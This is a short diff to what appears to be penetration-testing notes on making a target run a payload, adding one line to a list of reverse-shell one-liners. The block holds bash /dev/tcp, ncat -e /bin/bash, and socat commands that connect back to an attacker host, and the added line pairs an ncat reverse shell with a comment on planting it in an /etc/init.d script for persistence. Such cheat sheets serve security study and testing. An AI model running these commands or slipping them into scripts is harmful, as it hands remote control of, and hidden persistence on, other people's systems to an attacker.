@@ -65,6 +65,7 @@ Make the target execute the payload through vulnerability exploit
 ```bash
 bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' # redirect stdout and stderr to attacker machine and input to be executed where the stdout comes from (socket creation). For TCP socket 
 ncat <attacker-ip> <port> --ssl -e /bin/bash -v # for SSL connection, the target needs netcat binary
+ncat <ip> <port> -e /bin/bash 2> /dev/null & ;; # modify a /etc/init.d to add a payload, double semilicon as a terminator of case option
 socat exec 'bash -i',pty,stderr tcp:<attacker-ip>:<port> #pty pseudo-terminal connected to socket, -i Interactive bash, redirects stderr to attacker
 ```
 
